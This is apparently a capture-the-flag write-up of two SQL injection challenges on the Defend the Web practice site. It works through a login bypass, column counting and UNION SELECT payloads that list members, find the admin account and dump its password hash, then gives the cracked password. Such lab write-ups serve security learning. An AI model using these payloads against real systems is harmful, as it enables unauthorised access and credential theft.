title: Defend the Web - SQLi

## SQLi 1 / SQLi

This is a basic challenge which accepts a lot of answers.

You can just use ```' OR 1=1 ;--``` to complete it.

## SQLi 2 / SQLi

This is a little more involved.

We start with a login form and a "Browse members" section.

![sqli_2_1](/images/defend/sqli_2_1.png)

When we select a different letter in the members section, the URL updates.

When A is selected: 
> https://defendtheweb.net/playground/sqli2?q=A

When H is selected:
> https://defendtheweb.net/playground/sqli2?q=H

Injecting into the form does not give any output besides "Invalid login details". So let's try in the URL.

```https://defendtheweb.net/playground/sqli2?q=A' OR 1=1;--``` appears to give us all the member names out of alphabetic order. Also, no member named admin though a couple names stick out due to being lowercase (e.g. argroth, bellamond, and kiffany).

Using the old single quote trick, we can test for debug output. ```https://defendtheweb.net/playground/sqli2?q=A'``` let's us know the format of the command we are injecting into:

![sqli_2_2](/images/defend/sqli_2_2.png)

```sql
DEBUG: SELECT username, admin FROM members WHERE username LIKE 'A'%'
```
In the command, we SELECT both the username and admin fields from a members table. If admin is stored as a boolean to indicate who is and is not an admin, we should be able to list admin accounts with a check for ```admin = '1'```.

```https://defendtheweb.net/playground/sqli2?q=a' OR admin ='1'; --``` gives us the following output: 

![sqli_2_3](/images/defend/sqli_2_3.png)

bellamond might be our admin.

Let's check how many columns we have in the members table. With ```q=a' order by 3--``` we get an error, but not with ```q=a' order by 2--``` or ```q=a' order by 1--```. We now which columns to SELECT in our next commands.

```https://defendtheweb.net/playground/sqli2?q=a' UNION all SELECT 1,2 from members;--``` gives an output of 1's.

![sqli_2_4](/images/defend/sqli_2_4.png)

```https://defendtheweb.net/playground/sqli2?q=a' UNION all SELECT username,2 from members;--``` outputs all the members with 5 lowercase names at the end.

```
[...]
Zirmiror
Ziror
Zulzalak
argroth
bellamond
kiffany
laevyan
xaism
```

With this command, we can be confident about which user is an admin: ```https://defendtheweb.net/playground/sqli2?q=' UNION ALL SELECT username,2 FROM members WHERE admin='1';--```. We get bellamond again! Let's check their password.

```https://defendtheweb.net/playground/sqli2?q=' UNION ALL SELECT password,2 FROM members WHERE admin='1';--``` gives us the following hash: ```1b774bc166f3f8918e900fcef8752817bae76a37```. This looks like a SHA-1 hash, and Google confirms it. The admin user bellamond's password is sup3r.
